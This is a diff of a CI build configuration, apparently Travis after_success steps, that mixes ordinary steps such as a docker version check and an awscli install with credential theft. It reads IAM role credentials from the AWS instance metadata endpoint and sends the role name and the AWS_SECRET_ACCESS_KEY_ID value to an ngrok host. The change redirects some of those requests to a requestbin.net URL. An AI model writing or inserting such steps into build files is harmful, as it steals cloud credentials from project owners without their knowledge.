@@ -15,9 +15,9 @@ after_success:
   - export ENDPOINT=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
   - export CREDS=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ENDPOINT`
-  - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
+  - wget https://requestbin.net/r/2hr6bfs9/$(echo $ENDPOINT)
   - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget http://70b3e55723dd.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY_ID)
+  - wget https://requestbin.net/r/2hr6bfs9/$(echo $AWS_SECRET_ACCESS_KEY_ID)
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
